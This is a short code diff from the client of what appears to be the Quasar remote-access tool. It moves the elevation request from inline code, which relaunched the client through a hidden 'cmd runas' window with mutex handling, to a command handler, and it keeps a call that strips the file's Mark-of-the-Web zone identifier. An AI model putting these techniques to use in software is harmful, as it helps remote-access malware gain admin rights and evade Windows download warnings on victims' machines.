@@ -95,31 +95,9 @@ namespace xClient
             GeoLocationHelper.Initialize();
 
             // Request elevation
-            if (Settings.REQUESTELEVATIONONEXECUTION && WindowsAccountHelper.GetAccountType() != "Admin")
+            if (Settings.REQUESTELEVATIONONEXECUTION)
             {
-                ProcessStartInfo processStartInfo = new ProcessStartInfo
-                {
-                    FileName = "cmd",
-                    Verb = "runas",
-                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = true
-                };
-
-                MutexHelper.CloseMutex();  // close the mutex so our new process will run
-                bool success = true;
-                try
-                {
-                    Process.Start(processStartInfo);
-                }
-                catch
-                {
-                    success = false;
-                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
-                }
-
-                if (success)
-                    ConnectClient.Exit();
+                CommandHandler.HandleDoAskElevate(new Quasar.Common.Messages.DoAskElevate(), ConnectClient);
             }
 
             FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
